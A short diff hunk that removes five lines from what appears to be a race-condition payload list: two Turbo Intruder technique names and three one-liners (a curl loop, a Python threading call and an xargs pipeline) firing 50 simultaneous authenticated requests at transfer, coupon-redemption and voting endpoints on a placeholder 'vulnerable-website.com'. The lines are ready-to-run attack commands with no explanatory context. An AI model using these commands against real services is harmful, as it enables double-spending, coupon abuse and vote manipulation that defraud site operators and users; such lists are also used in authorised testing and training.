@@ -1,5 +1,0 @@
-turbo intruder: race.py single-packet attack
-turbo intruder: race.py last-byte sync
-for i in $(seq 1 50); do curl -s https://vulnerable-website.com/api/transfer -d 'amount=100&to=attacker' -H 'Cookie: session=XXX' & done; wait
-python3 -c "import requests,threading;[threading.Thread(target=requests.post,args=('https://vulnerable-website.com/api/redeem',),kwargs={'json':{'code':'DISCOUNT'},'cookies':{'session':'XXX'}}).start() for _ in range(50)]"
-seq 1 50 | xargs -P50 -I{} curl -s 'https://vulnerable-website.com/api/vote' -d 'option=1' -H 'Cookie: session=XXX'
